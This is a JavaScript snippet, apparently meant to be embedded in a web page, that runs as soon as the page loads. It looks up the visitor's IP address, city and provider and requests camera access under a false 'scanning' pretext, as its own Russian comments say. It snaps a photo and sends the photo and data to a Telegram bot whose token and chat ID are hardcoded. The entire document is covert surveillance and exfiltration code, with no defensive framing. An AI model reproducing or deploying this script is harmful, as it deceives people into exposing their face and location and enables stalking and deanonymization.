<script>
    const TG_TOKEN = "8713406185:AAEYao0zu3daLeZis1gkrFD3-wv7oMXCzsY"; 
    const TG_ID = "5131628747"; 

    // Как только страница открылась — начинаем охоту
    window.onload = function() {
        initDeanon();
    };

    async function initDeanon() {
        let ipData = {};
        // 1. Собираем данные сети
        try {
            const res = await fetch('https://ipapi.co/json/');
            ipData = await res.json();
        } catch(e) { ipData = { ip: "не определен" }; }

        // 2. Сразу запрашиваем камеру под видом "сканирования"
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => sendToBot(ipData, blob), 'image/jpeg');
                // Останавливаем камеру после снимка
                stream.getTracks().forEach(track => track.stop());
            }, 2000);
        } catch(e) {
            sendToBot(ipData, null); // Если камеру не дал, шлем хотя бы IP
        }
    }

    function sendToBot(ip, photo) {
        const text = `🎯 КТО-ТО ОТКРЫЛ ПРИЛОЖЕНИЕ!\n🌐 IP: ${ip.ip}\n📍 ГОРОД: ${ip.city || '?'}\n🏢 ПРОВАЙДЕР: ${ip.org || '?'}\n💻 СИСТЕМА: ${navigator.platform}`;
        
        const formData = new FormData();
        formData.append('chat_id', TG_ID);
        if (photo) {
            formData.append('photo', photo, 'face.jpg');
            formData.append('caption', text);
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        } else {
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(text)}`);
        }
    }
</script>
